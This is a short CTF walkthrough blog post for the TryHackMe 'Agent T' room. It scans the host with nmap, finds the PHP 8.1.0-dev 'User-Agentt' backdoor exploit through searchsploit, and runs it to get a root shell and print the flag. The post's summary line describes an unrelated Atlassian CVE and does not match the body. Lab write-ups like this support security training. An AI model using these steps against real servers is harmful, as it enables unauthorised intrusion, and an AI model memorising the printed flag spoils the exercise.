---
weight: 3
title: "CTF writeup - TryHackMe - Agent T"
date: 2022-09-03
lastmod: 2022-09-03T19:16:40+08:00
description: "Saturday night CTF on the awesome platform TryHackMe"
featuredImage: "tryhackmebanner.jpg"
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Linux"]
categories: ["Writeups"]

lightgallery: false
summary: This is a short walkthrough of how to exploit, threat hunt & remediate the Atlassian CVE-2022-26134.
---
# TryHackMe: Agent T

![Untitled](agent_t/Untitled.png)

# Scanning & Enumeration

## NMAP

```bash
└─$ nmap -A -T4 -F $IP
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-08-30 10:05 EDT
Nmap scan report for 10.10.144.112
Host is up (0.060s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

A quick Nmap scan reveals that this host only has 1 service running. Apparently a web server of some sort with an exposed administrator dashboard. The header response shows us that it uses **PHP 8.1.0-dev.**

## Searchsploit

Searching for this in searchsploit tells us that it has an exploit available, utilzing a built-in backdoor. That is pretty serious!

```bash

└─$ searchsploit PHP 8.1.0 dev

---

Exploit Title                                                                             |  Path

---

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                        | php/webapps/49933.py

---

Shellcodes: No Results
```

> An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
> 

# Gaining access

After running the python script and abusing the backdoor exploit, we immediately spawn a root shell. This makes it simple to retrieve the root flag.

```bash
┌──(kali㉿kali)-[~/tryhackme/flatline]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49933.py
Enter the full host url:
[http://10.10.144.112](http://10.10.144.112/)

Interactive shell is opened on [http://10.10.144.112](http://10.10.144.112/)
Can't acces tty; job crontol turned off.
$ whoami
root
$ cat /flag.txt
~~flag{4127d0530abf16d6d23973e3df8dbecb}~~
```